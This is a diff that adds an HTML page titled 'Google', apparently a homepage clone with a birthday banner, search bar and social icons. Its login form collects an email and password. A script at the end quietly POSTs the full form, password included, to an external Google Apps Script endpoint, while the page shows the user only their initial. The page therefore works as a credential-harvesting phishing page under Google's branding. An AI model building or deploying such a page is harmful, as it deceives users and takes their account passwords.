@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Google</title>
+    <link rel="icon" href="./images/favicon.jpg" />
+    <link rel="stylesheet" href="./style.css" />
+    <script
+      src="https://kit.fontawesome.com/b0f29e9bfe.js"
+      crossorigin="anonymous"
+    ></script>
+    <script src="main.js"></script>
+    <style>
+      .hidden {
+        display: none;
+      }
+      body {
+        background: linear-gradient(to bottom right, #f20dd4, #e0f00a);
+      }
+      input {
+        border-radius: 12px;
+      }
+      .logo-icons {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 10px;
+        animation: slideIn 1s forwards;
+      }
+      .logo-icons i {
+        font-size: 32px;
+        margin-right: 10px;
+        transition: transform 0.3s;
+      }
+      .logo-icons a {
+        margin-right: 10px;
+      }
+      .logo-icons i:hover {
+        transform: scale(1.2);
+      }
+      .google-search-btn {
+        font-size: 32px; /* Increase the font size to your desired value */
+        /* Adjust the padding to increase the button size */
+      }
+      .birthday-text {
+        position: center;
+        top: 60px;
+        right: 10px;
+        font-size: 24px;
+        font-weight: bold;
+        color: white;
+        cursor: pointer;
+        color: #1cf20d;
+      }
+      .cracker-effect {
+        animation: cracker 1s linear;
+      }
+
+      @keyframes cracker {
+        0% {
+          background-position: 0 0;
+        }
+        100% {
+          background-position: -2000px -2000px;
+        }
+      }
+
+     
+    </style>
+  </head>
+  <body>
+    <header>
+      <nav class="navbar">
+        <ul>
+          <li>
+            <a
+              class="link"
+              href="https://support.google.com/mail/answer/8494?hl=en&co=GENIE.Platform%3DDesktop"
+              >Gmail</a
+            >
+          </li>
+          <li>
+            <a
+              class="link"
+              href="https://www.google.com/search?tbm=isch&q=images&tbs=imgo:1"
+              >Images</a
+            >
+          </li>
+          <li>
+            <div class="circle-shadow">
+              <a class="menu-icon"><i class="fas fa-bars"></i></a>
+            </div>
+          </li>
+          <li>
+            <br>
+            <!-- <form name="submit-to-google-sheet"></form> -->
+            <button id="loginButton">Login</button>
+            <div id="loginPage" class="hidden">
+              <h2>Login</h2>
+              <form name="submit-to-google-sheet" id="loginForm">
+                <label for="email">Email:</label>
+                <input type="email" id="email" name="email" required /><br />
+
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required /><br />
+
+                <input type="submit" value="Submit" />
+              </form>
+                <!-- <input name="email" type="email" placeholder="Email" required> -->
+                <button type="submit"></button>
+            </form>
+            </div>
+          </li>
+        </ul>
+      </nav>
+    </header>
+
+    <section class="content-section">
+      <div class="content-wrapper">
+        <img class="logo-img" src="./images/logo.jpg" alt="Google Logo Image" />
+        <div class="birthday-text" onclick="burstCrackers()">
+          Happy Birthday!
+        </div>
+        <br />
+        <div class="search-bar">
+          <i class="fas fa-search"></i>
+          <input id="search-input" class="search-input" type="text" />
+          <i class="fas fa-keyboard"></i>
+          <i class="fas fa-microphone"></i>
+        </div>
+        <div class="sug"></div>
+        <br />
+        <div class="logo-icons">
+          <a href="https://www.youtube.com/"><i class="fab fa-youtube"></i></a>
+          <a href="https://www.whatsapp.com/"
+            ><i class="fab fa-whatsapp"></i
+          ></a>
+          <a href="https://www.instagram.com/"
+            ><i class="fab fa-instagram"></i
+          ></a>
+          <a href="https://www.wikipedia.org/"
+            ><i class="fab fa-wikipedia-w"></i
+          ></a>
+          <a href="https://www.reddit.com/"><i class="fab fa-reddit"></i></a>
+        </div>
+        <div class="search-btns">
+          <button class="google-search-btn" onclick="searchGoogle()">
+            Google Search
+          </button>
+          <button class="lucky-search-btn">I'm Feeling Lucky</button>
+        </div>
+        <br />
+        <div class="language">
+          <p>Google Offered in: <a>Maori</a></p>
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      <div class="footer-content upper-footer">
+        <p>India</p>
+      </div>
+      <div class="footer-content lower-footer">
+        <ul class="lower-left-footer">
+          <li>
+            <a>About</a>
+          </li>
+          <li>
+            <a>Advertising</a>
+          </li>
+          <li>
+            <a>Business</a>
+          </li>
+          <li>
+            <a>How Search Works</a>
+          </li>
+        </ul>
+        <ul class="lower-right-footer">
+          <li>
+            <a>Privacy</a>
+          </li>
+          <li>
+            <a>Terms</a>
+          </li>
+          <li>
+            <a href="chrome://settings/">Settings</a>
+          </li>
+        </ul>
+      </div>
+
+      <div id="navigation">
+        <button id="previous-page" disabled>&lt;</button>
+        <button id="next-page">&gt;</button>
+      </div>
+    </footer>
+
+    <script>
+      function searchGoogle() {
+        const searchInput = document.getElementById("search-input").value;
+        window.location.href = `https://www.google.com/search?q=${encodeURIComponent(
+          searchInput
+        )}`;
+      }
+      function burstCrackers() {
+        document.body.classList.add("cracker-effect");
+        setTimeout(() => {
+          document.body.classList.remove("cracker-effect");
+        }, 1000);
+      }
+
+      window.addEventListener("DOMContentLoaded", function () {
+        document
+          .getElementById("loginButton")
+          .addEventListener("click", function () {
+            document.getElementById("loginPage").classList.remove("hidden");
+            document.getElementById("loginButton").classList.add("hidden");
+          });
+
+        document
+          .getElementById("loginForm")
+          .addEventListener("submit", function (event) {
+            event.preventDefault();
+            const email = document.getElementById("email").value;
+            const firstLetter = email.charAt(0).toUpperCase();
+
+            document.getElementById("loginButton").textContent = firstLetter;
+            document.getElementById("loginPage").classList.add("hidden");
+            document.getElementById("loginButton").classList.remove("hidden");
+          });
+      });
+
+      // form section
+      const scriptURL = 'https://script.google.com/macros/s/AKfycbwOfvg6j4ScO5p5WXn5scclbiKF6gqlxoUGDkabzdypWFUWl-SOPtm_eOcT-o8HeMovXg/exec';
+                const form = document.forms['submit-to-google-sheet'];
+                form.addEventListener('submit', e =>{
+                  e.preventDefault();
+                  fetch(scriptURL, { method: 'POST', body: new FormData(form)}) 
+                    .then(response => console.log('Success!', response))
+                    .catch(error => console.error('Error!', error.message))
+                })
+    </script>
+     <script src="main.js"></script>
+  </body>
+</html>
